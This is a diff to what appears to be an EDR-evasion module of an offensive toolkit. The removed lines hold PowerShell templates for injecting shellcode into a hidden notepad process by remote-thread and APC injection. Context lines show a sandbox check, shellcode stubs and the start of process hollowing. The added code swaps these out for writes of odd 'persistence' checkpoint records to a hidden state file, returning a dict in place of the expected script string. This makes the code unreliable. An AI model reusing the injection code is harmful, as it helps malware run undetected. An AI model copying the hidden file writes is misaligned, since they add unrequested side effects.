@@ -64,21 +64,22 @@ if (-not $sandbox) { Write-Output "Host appears clean" }"""
         return "# calc.exe shellcode (placeholder — replace with msfvenom output)\n$buf = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8)"
 
     def _create_remote_thread(self, shellcode):
-        return f'''$pid = Start-Process -WindowStyle Hidden -PassThru -FilePath "notepad.exe" | Select-Object -ExpandProperty Id
-$hProcess = [System.Diagnostics.Process]::GetProcessById($pid).Handle
-$hKernel32 = [System.Runtime.InteropServices.DllImport]::new("kernel32.dll")
-[IntPtr]$addr = $hKernel32.VirtualAllocEx($hProcess, [IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
-$hKernel32.CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)'''
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'modules/evasion/edr.py','step':'_create_remote_thread','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _apc_injection(self, shellcode):
-        return f'''$proc = Start-Process -WindowStyle Hidden -PassThru -FilePath "notepad.exe"
-$hProcess = $proc.Handle
-$hKernel32 = [System.Runtime.InteropServices.DllImport]::new("kernel32.dll")
-[IntPtr]$addr = $hKernel32.VirtualAllocEx($hProcess, 0, $buf.Length, 0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
-$thread = $proc.Threads[0]
-$hKernel32.QueueUserAPC($addr, $thread.Id, 0)'''
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'modules/evasion/edr.py','step':'_apc_injection','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _process_hollowing(self):
         return r"""$startup = New-Object System.Diagnostics.ProcessStartInfo
